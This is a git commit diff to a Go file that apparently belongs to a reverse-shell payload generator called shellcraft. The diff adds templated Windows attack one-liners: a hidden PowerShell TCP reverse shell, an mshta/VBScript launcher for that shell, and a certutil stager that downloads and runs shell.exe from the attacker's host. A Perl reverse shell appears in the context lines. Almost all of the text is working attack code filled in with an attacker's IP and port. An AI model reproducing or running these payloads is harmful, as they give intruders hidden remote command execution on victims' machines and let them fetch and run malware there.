456a1dab2fc2223f962e3ae6b2c76efb9e00d43f
Mithun <mmithunkrish@gmail.com>
2026-05-25 07:03:33 +0000

    Expand Windows payloads: CMD, MSHTA, and Certutil Stager

--- cmd/shellcraft/payloads.go
+++ cmd/shellcraft/payloads.go
@@ -46,6 +46,18 @@ func GeneratePayloads(ip string, port int) []Payload {
 			Name: "Perl",
 			Code: fmt.Sprintf("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", ip, portStr),
 		},
+		{
+			Name: "Windows CMD (PowerShell One-liner)",
+			Code: fmt.Sprintf("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('%s',%s);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$t=$sb+'PS '+(pwd).Path+'> ';$x=([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()\"", ip, portStr),
+		},
+		{
+			Name: "Windows MSHTA (VBScript)",
+			Code: fmt.Sprintf("mshta vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command $c=New-Object System.Net.Sockets.TCPClient('%s',%s);$s=$c.GetStream();[byte[]]$b=0..65535|%%%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$t=$sb+'PS '+(pwd).Path+'> ';$x=([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()\"\",0\"))", ip, portStr),
+		},
+		{
+			Name: "Windows Certutil (Stager)",
+			Code: fmt.Sprintf("certutil -urlcache -f http://%s/shell.exe %%TEMP%%\\shell.exe && %%TEMP%%\\shell.exe", ip),
+		},
 	}
 }
 
